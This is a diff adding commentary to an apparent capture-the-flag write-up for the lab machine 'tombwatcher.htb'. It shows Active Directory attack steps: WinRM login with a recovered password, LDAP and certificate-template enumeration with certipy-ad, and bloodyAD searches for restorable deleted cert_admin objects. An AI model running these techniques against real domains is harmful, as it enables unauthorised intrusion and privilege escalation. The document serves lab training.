@@ -365,7 +365,8 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 ### User flag
 
-john is member of the remote management use
+john is member of the remote management user, thus allowing winRM access over the domain controller:
+
 ```
  evil-winrm -i tombwatcher.htb -u john -p 'newP@ssword2022'   
                                         
@@ -430,6 +431,7 @@ b3438e9f759311d129b2b03ecaaa313f
 
 ### Enumeration
 
+john has `GenericAll` over the OU `ADCS`, 
 ```
  netexec ldap 10.129.144.23 -u john -p 'newP@ssword2022' --query "(ou=ADCS)" ""
 LDAP        10.129.144.23   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
@@ -467,6 +469,7 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 ```
 
+Searching for vulnerable templates discloses nothing useful:
 ```
 certipy-ad find -u john -p 'newP@ssword2022' -dc-ip 10.129.144.23 -vulnerable -stdout                                  
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
@@ -517,6 +520,7 @@ Certificate Templates                   : [!] Could not find any certificate tem
                                             
 ```
 
+Searching all the templates discloses a template that references its own SID:
 ```
 certipy-ad find -u john -p 'newP@ssword2022' -dc-ip 10.129.144.23 -stdout -enabled
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
@@ -1032,6 +1036,8 @@ Certificate Templates
       ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
 
 ```
+
+Enumerating writeable objects by john exposes three object `cert_admin` which are deleted but can be restored due to write access:
 
 ```
 bloodyAD --host tombwatcher.htb --dns 10.129.144.23 -d tombwatcher.htb -u john -p 'newP@ssword2022' get writable
